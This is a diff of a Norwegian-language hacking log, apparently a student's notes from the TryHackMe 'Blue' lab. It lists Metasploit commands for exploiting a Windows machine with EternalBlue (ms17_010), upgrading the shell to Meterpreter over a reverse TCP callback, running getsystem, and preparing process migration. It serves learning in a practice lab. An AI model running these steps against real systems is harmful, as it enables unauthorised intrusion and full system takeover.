@@ -1,9 +1,50 @@
-#Logg for skrivDatoHer
+#Logg for 26/04/2020
 
-#Hva slags type maskin er utsatt: 
-#Utsatt maskin sin ip: 
+#Hva slags type maskin er utsatt: Blue
+#Utsatt maskin sin ip: 10.10.142.72
 
 #Beskriv hva du har gjort under hackingen + kommandoer
+Fortsettelse fra Logg-25-04-2020
 
+#Siste steg fra dagen foor:
+Gaar over til aa bruke exploit modulen for aa faktisk utnytte utsatt maskin:
+use exploit/windows/smb/ms17_010_eternalblue    #Gaar over til exploit modulen
+setg rhost 10.10.208.123                        #Setter paakrevd variabel til aa vaere utsatt maskin, NB legg merke til "g" brukt i setg. Da er variabelen globalt for alle moduler
+run                                             #Prover aa kjoore modulen, det ble vellykket og jeg fikk en terminal/shell ookt paa windows maskinen.
+
+Jeg gjennomforte trinnvis alle stegene fra gaarsdagen og har naa shell i utsatt maskin etter aa ha gjennomfort exploiten:
+use exploit...
+setg rhost 10.10.142.72
+run
+
+#naa har vi en shell, men siden det kunn er en cmd.exe paa utsatt maskin er det begrenset hvor mye Metasploit for gjort.
+#Derfor er det en god ide aa eskalere vaare rettigheter for aa faa meterpreter shell.
+#Meterpreter shell lar oss laste ned og opp filer, lar oss kjoore post-exploitation tools, scripts og andre Metasploit moduler. 
+
+Jeg tar aa putter utsatt maskin sin shell som en bakgrunnsprosess:
+background		#Kan trykke ctrl-c, men avhengig av shell-ett ditt kan du ende opp med aa avslutte hele Metasploit. Bedre aa bruke "background"
+#background er ikke en kommando i windows shell, men siden vi kjorer shell i Metasploit forstaar den at vi oonsker aa putte prosessen i bakgrunnen.
+
+kjorer shell to meterpreter for aa eskalere vaart shell:
+use shell_to_meterpreter		#Kan kanskje bare bruke run istedenfor use, altsaa run shell_to_meterpreter
+#path til modulen er post/multi/manage/shell_to_meterpreter, trenger heldigvis ikke gi hele path fordi denne post modulen er saapas vanlig
+
+Setter nodvendige variabler i shell_to_meterpreter modulen:
+set SESSION 1		#Du maa angi ID paa session som du oonsker aa eskalere
+#Kan ogsaa bruke sessions -u idPaaSession for aa eskalere til meterpreter
+
+Variablene er sett og jeg kan naa kjore post modulen:
+run	#Naa vil Metasploit starte reverse TCP handler, I praksis faar den utsatt pc til aa sende signal tilbake til vaar pc, tror faktisk det er meterpreter som kaller tilbake.
+	#saa venter og lytter maskinen vaar paa aa faa signal fraa utsatt maskin, tror signalet er fra meterpreter, naar vi faar signalet har vi eskalert til meterpreter!
+
+Jeg fikk "callback" fra Meterpreter og da ble det etablert en ny ookt automatisk, nemlig en meterpreter session.
+Naa aapnet jeg den nye ookten og proovde aa eskalere/elevate mine rettigheter som local system, det er forNorsking av help kommando paa meterpreter:
+getsystem		#getsystem gjor automatisk en del forskjellige forsok paa forskjellige "avenues" til aa anslaa/determine/finne en maate til aa faa nt authority system sin konto. For eksempel uac bypass, pipe impersonation eller lignende.
+#I vaart tilfelle var vi allere nt authority\system naar vi fikk den opprinnelige cmd.exe shell okten gjennom ms17_010 exploiten saa vi trengte ikke aa gjoore getsystem i meterpreter, uansett er det greit aa faa det bekreftet. 
+
+Henter opp alle prosessene paa utsatt maskin:
+ps		#ps for prosess/prosesses/prosess list, output er en fin format table med ID navn osv. Her faar vi altsaa PID (process ID) PPID (Parent process ID) osv som vi kan bruke paa aa migrere til en stabil prosess senere. en ustabil prosess kan jo bli terminert av mange grunner og da mister vi vaar session... saa aa migrere til en prosess som er stabil er essensielt. 
+
+Jeg migrerer min meterpreter process "inn memory", usikker paa hva det akkurat innebaerer men kan vel vaere at meterpreter kjorer paa utsatt sin maskin sitt minne, det var sitat fra John Hammond sin TryHackMe EternalBlue video:
 
 
